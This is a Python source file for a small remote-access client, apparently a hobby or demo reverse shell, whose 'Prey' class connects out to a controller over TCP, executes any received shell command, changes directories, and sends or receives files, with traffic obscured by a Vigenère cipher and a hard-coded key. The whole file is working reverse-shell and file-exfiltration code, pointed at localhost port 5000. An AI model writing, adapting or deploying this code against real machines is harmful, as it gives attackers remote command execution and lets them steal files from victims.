#-*-coding: utf-8-*-
from socket import socket, AF_INET, SOCK_STREAM
from crypt import Vigenere as v
from time import sleep
from sys import argv
from os import chdir, getcwd
from subprocess import PIPE
from subprocess import Popen as popen
class Prey:

	def __init__(self, ip, port, key):
		self.v = v(key);
		self.sock = socket(AF_INET, SOCK_STREAM);
		self.sock.connect((ip, port));
		self.shell();

	def shell(self):
		msj = self.recv();
		while(msj):
			if(msj[:3] == "get" or msj[:4] == "send"):
				print("!");
				b = False;
				for t in msj.split(" "):
					if(not b):
						b = True;
						do = t; 
					else:
						file = t;
				if(do == "get"):
					self.sendFile(file);
				else:
					self.getFile(file);
				self.send("Done!");
			elif(msj[:2] == "cd"):
				try:
					chdir(msj[3:]);
				except:
					self.send("Directory not found.");
				else:
					self.send("{}".format(getcwd()));
			else:
				cmd = popen(msj, shell=True,stdout=PIPE,stderr=PIPE);
				stdout, stderr = cmd.communicate();
				out = "{}{}".format(stdout.decode('latin1'), stderr.decode('latin1'));
				self.send(out);
			msj = self.recv();

	def send(self, m, encrypt=True):
		if(encrypt):
			m = self.v.encrypt(m);
		if(type(m) != type(b"byte")):
			m = str(m).encode();
		self.sock.send(m);

	def recv(self, prnt=False,decrypt=True,decode=True, b=1024):
		try:
			msj = self.sock.recv(b);
		except:
			return False;
		else: 
			
			if(decrypt):
				msj = self.v.decrypt(msj.decode()).encode();
			if(decode):
				msj = msj.decode();
			if(prnt):
				print(msj);
			return msj;

	def sendFile(self, file):
		self.send("** {}".format(file));
		print("Sending file");
		try:
			with open(file,"rb") as f:
				content = f.read(1024);
		except Exception as e:
			self.send("{}".format(e));
		else:
			self.send(content); 
	def getFile(self,  file):
		print("Getting file."),
		try:
			with open(file, "wb") as f:
				content = self.sock.recv(1024);
				f.write(content);
		except Exception as e:
			self.send("There was a problem writting the file.");
		else:
			self.send("The file was sended succesfully!");

def main():
	p = Prey("127.0.0.1", 5000,"eajlkwbcpqynvhigdrzotusfmx");

if __name__ == '__main__':
	main();